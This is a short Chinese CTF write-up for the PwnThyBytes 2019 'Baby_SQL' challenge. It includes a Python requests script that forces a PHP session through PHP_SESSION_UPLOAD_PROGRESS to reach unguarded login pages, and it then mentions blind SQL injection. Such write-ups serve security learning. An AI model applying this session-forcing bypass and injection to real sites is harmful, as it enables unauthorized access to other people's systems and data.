---
title: '[PwnThyBytes 2019]Baby_SQL'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-02-06 20:01:00
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128093.jpg
---
注释里提示source.zip源码泄露。

首先在index.php看到filter函数对每一个变量都进行了转义，所以不存在注入点。

register.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210206161827.png)

login.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210206161854.png)

都没有过滤，但是可以看到都不能直接访问，需要传入session。

在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()

    import requests
    
    url = "http://87e4b96f-0493-4255-9fe6-e0c49874f234.node3.buuoj.cn/templates/login.php"

    files = {"file": "123456789"}
    a = requests.post(url=url, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                      cookies={"PHPSESSID": "test1"}, params={'username': 'test', 'password': 'test'},
                      proxies={'http': "http://127.0.0.1:8080"})
    print(a.text)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210206170209.png)

伪造成功，有回显了。
接下来直接盲注就行，这样就饶过了index的过滤。